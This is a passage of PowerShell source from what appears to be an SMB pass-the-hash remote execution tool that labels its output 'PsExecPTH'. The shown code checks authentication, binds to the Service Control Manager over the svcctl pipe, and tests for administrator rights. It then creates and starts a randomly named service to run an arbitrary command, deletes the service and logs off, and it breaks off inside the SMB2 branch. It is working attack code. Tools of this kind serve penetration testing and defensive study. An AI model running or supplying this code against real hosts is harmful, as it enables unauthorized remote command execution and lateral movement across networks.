        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
    }

    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
    $SMB_client_stream.Flush()
    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

    if($SMB_version -eq 'SMB1')
    {

        if([System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00')
        {
            write-output "$output_username successfully authenticated on $Target"
            $login_successful = $true
        }
        else
        {
            write-output "$output_username failed to authenticate on $Target"
            $login_successful = $false
        }

    }
    else
    {
        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00')
        {
            write-output "$output_username successfully authenticated on $Target"
            $login_successful = $true
        }
        else
        {
            write-output "$output_username failed to authenticate on $Target"
            $login_successful = $false
        }

    }

    if($login_successful)
    {
        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }

        $SMB_named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!$Service)
        {
            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace "-00",""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
                
            }

        }
        
        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.length + 1)

        if($CommandCOMSPEC -eq 'Y')
        {
            $Command = "%COMSPEC% /C `"" + $Command + "`""
        }
        else
        {
            $Command = "`"" + $Command + "`""
        }

        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$PsExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $PsExec_command += '00-00'
        }
        else
        {
            $PsExec_command += '00-00-00-00'
        }    
        
        $PsExec_command_bytes = $PsExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
        $PsExec_command_length_bytes = [System.BitConverter]::GetBytes($PsExec_command_bytes.Length / 2)
        

        if($SMB_version -eq 'SMB1')
        {
            $SMB_client_stage = 'TreeConnectAndXRequest'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {
            
                switch ($SMB_client_stage)
                {
            
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CreateAndXRequest'
                    }
                  
                    'CreateAndXRequest'
                    {
                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $SMB_client_receive[28,29]
                        $packet_SMB_header = Get-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'DCERPCBind'
                    }
                
                    'DCERPCBind'
                    {
                        $SMB_FID = $SMB_client_receive[42,43]
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_DCERPC_data = Get-PacketDCERPCBind $SMB_named_pipe_UUID  
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest
                        $packet_SMB_data["SMBWriteAndXRequest_Remaining"] = 0x48,0x00
                        $packet_SMB_data["SMBWriteAndXRequest_DataLengthLow"] = 0x48,0x00
                        $packet_SMB_data["SMBWriteAndXRequest_ByteCount"] = 0x48,0x00
                        $packet_SMB_data["SMBWriteAndXRequest_FID"] = $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                        $DCERPC_data_length = $SMB_data.Length + $DCERPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $DCERPC_data_Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $DCERPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $DCERPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
               
                    'ReadAndXRequest'
                    {
                        Start-Sleep -m 100
                        $packet_SMB_header = Get-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBReadAndXRequest
                        $packet_SMB_data["SMBReadAndXRequest_FID"] = $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = $SMB_client_stage_next
                    }
                
                    'OpenSCManagerW'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = Get-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SCM_data.length
                        $packet_SMB_data["SMBWriteAndXRequest_FID"] = $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                        $DCERPC_data_length = $SMB_data.Length + $SCM_data.Length + $DCERPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $DCERPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CreateServiceW'           
                    }
                
                    'CreateServiceW'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            Write-Output "$output_username is a local administrator on $Target"
                            $SMB_service_manager_context_handle = $SMB_client_receive[88..107]
                            $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                            if($SMB_signing)
                            {
                                $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                                $SMB_signing_counter = $SMB_signing_counter + 2 
                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                            }

                            $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $PsExec_command_bytes $PsExec_command_length_bytes
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                            $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x0c,0x00
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SCM_data.length
                            $packet_SMB_data["SMBWriteAndXRequest_FID"] = $SMB_FID
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                            $DCERPC_data_length = $SMB_data.Length + $SCM_data.Length + $DCERPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $DCERPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                                $SMB_signature = $MD5.ComputeHash($SMB_sign)
                                $SMB_signature = $SMB_signature[0..7]
                                $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadAndXRequest'
                            $SMB_client_stage_next = 'StartServiceW'   
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')
                        {
                            Write-Output "$output_username is not a local administrator on $Target"
                            $PsExec_failed = $true
                        }
                        else
                        {
                            $PsExec_failed = $true
                        }
               
                    }

                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '00-00-00-00')
                        {
                            Write-Output "PsExecPTH service $SMB_service created on $Target"
                            $SMB_service_context_handle = $SMB_client_receive[92..111]
                            $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID
                            $packet_SMB_header["SMBHeader_ProcessID"] = $process_ID_bytes

                            if($SMB_signing)
                            {
                                $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                                $SMB_signing_counter = $SMB_signing_counter + 2 
                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                            }

                            $packet_SCM_data = Get-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                            $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x13,0x00
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SCM_data.length
                            $packet_SMB_data["SMBWriteAndXRequest_FID"] = $SMB_FID
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                            $DCERPC_data_length = $SMB_data.Length + $SCM_data.Length + $DCERPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $DCERPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                                $SMB_signature = $MD5.ComputeHash($SMB_sign)
                                $SMB_signature = $SMB_signature[0..7]
                                $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                            Write-Output "Trying to execute command on $Target"
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadAndXRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'  
                        }
                        else
                        {
                            $SMB_execute_error_message = "Service creation fault context mismatch"
                            $PsExec_failed = $true
                        }
    
                    }
                
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '1d-04-00-00')
                        {
                            Write-Output "PsExecPTH command executed on $Target"
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '02-00-00-00')
                        {
                            Write-Output "PsExecPTH service $SMB_service failed to start on $Target"
                        }

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                        $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x02,0x00
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SCM_data.length
                        $packet_SMB_data["SMBWriteAndXRequest_FID"] = $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                        $DCERPC_data_length = $SMB_data.Length + $SCM_data.Length + $DCERPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $DCERPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'CloseServiceHandle'
                    {
                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Output "PsExecPTH service $SMB_service deleted on $Target"
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                        $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x00,0x00
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SCM_data.length
                        $packet_SMB_data["SMBWriteAndXRequest_FID"] = $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                        $DCERPC_data_length = $SMB_data.Length + $SCM_data.Length + $DCERPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $DCERPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $DCERPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Logoff'
                    }

                    'Logoff'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
            
                if($PsExec_failed)
                {
                    Write-Output "PsExecPTH failed on $Target"
                    BREAK SMB_execute_loop
                }
            
            }

        }  
        else
        {
            
            $SMB_client_stage = 'TreeConnect'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {

                switch ($SMB_client_stage)
                {
            
                    'TreeConnect'
                    {
                        $SMB2_message_ID += 1
                        $packet_SMB2_header = Get-PacketSMB2Header 0x03,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        if($SMB_signing)
                        {
